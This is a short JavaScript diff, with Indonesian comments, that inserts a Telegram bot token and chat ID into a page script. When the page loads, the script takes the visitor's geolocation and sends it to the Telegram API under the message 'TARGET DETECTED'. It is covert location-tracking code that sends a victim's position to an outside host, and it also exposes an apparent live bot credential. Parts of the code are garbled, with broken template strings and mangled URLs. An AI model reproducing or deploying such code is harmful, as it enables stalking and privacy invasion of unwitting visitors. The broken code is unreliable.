@@ -9,8 +9,8 @@ window.onload = function() {
 function sendToTelegram(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
-    const token = "ISI_TOKEN_BOT_TELEGRAM_KAMU"; // Ambil dari @BotFather
-    const chat_id = "ISI_CHAT_ID_KAMU"; // Ambil dari @userinfobot
+    const token = "AAHq7-quLLEnR1oaFMrULfSW4Wchu25R-ms"; // Ambil dari @BotFather
+    const chat_id = "5207296131"; // Ambil dari @userinfobot
     const text = 🎯 TARGET TERDETEKSI!%0A📍 Lokasi: https://www.google.com{lat},${lon};
 
     fetch(https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text})
